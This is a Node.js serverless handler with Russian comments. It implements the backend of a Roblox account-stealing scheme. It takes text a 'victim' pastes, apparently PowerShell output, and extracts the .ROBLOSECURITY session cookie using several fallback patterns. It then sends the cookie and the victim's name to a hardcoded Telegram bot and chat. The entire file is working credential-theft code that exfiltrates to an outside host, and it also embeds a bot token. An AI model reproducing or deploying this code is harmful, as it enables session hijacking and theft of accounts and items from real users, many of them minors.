const fetch = require('node-fetch');

// ===== ТВОИ ДАННЫЕ (захардкожены) =====
const BOT_TOKEN = "8961899780:AAGUBR-ve4PSdX86Vniv-l1kJx3f7qm0njE";
const CHAT_ID = "-5527664230";
// ========================================

const PREFIX = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";

function extractCookie(text) {
    const pattern = /[A-Za-z0-9._\-]{30,}/g;
    const matches = text.match(pattern);
    if (matches) {
        let longest = '';
        for (let m of matches) {
            if (m.length > longest.length) longest = m;
        }
        return longest;
    }
    return null;
}

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const { victim, code } = JSON.parse(event.body);
        if (!victim || !code) {
            return { statusCode: 400, body: JSON.stringify({ error: 'Missing fields' }) };
        }

        let raw = null;

        // 1) Если есть префикс – берём всё после него до первого недопустимого символа
        if (code.includes(PREFIX)) {
            const start = code.indexOf(PREFIX) + PREFIX.length;
            let end = start;
            for (let i = start; i < code.length; i++) {
                const ch = code[i];
                if (/[A-Za-z0-9._\-]/.test(ch)) {
                    end = i + 1;
                } else {
                    break;
                }
            }
            raw = code.substring(start, end);
        }

        // 2) Если нет – ищем .ROBLOSECURITY=...
        if (!raw) {
            const match = code.match(/\.ROBLOSECURITY=([A-Za-z0-9._\-]+)/);
            if (match) raw = match[1];
        }

        // 3) Если нет – ищем "WARNING:-DO-NOT-SHARE-THIS..." без подчёркиваний
        if (!raw) {
            const warning = "WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.";
            const idx = code.indexOf(warning);
            if (idx !== -1) {
                const start = idx + warning.length;
                let end = start;
                for (let i = start; i < code.length; i++) {
                    const ch = code[i];
                    if (/[A-Za-z0-9._\-]/.test(ch)) {
                        end = i + 1;
                    } else {
                        break;
                    }
                }
                raw = code.substring(start, end);
            }
        }

        // 4) Если ничего не нашли – пытаемся выцепить любую длинную строку
        if (!raw) {
            const cookie = extractCookie(code);
            if (cookie) raw = cookie;
        }

        let token = null;
        if (raw) {
            const clean = raw.replace(/[^A-Za-z0-9._\-]/g, '');
            if (clean.length > 20) {
                token = PREFIX + clean;
            }
        }

        if (!token) {
            return { statusCode: 400, body: JSON.stringify({ error: 'Invalid PowerShell format' }) };
        }

        // Отправка в Telegram – БЕЗ parse_mode, чтобы подчёркивания не превращались в курсив
        const message = `🆕 Token for ${victim}:\n${token}`;
        const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
                // parse_mode не указываем, чтобы текст был обычным
            })
        });

        if (!tgResponse.ok) {
            const errText = await tgResponse.text();
            console.error('Telegram error:', errText);
            return { statusCode: 500, body: JSON.stringify({ error: 'Failed to send to Telegram' }) };
        }

        return {
            statusCode: 200,
            body: JSON.stringify({ token })
        };
    } catch (error) {
        console.error('Function error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Internal server error' })
        };
    }
};
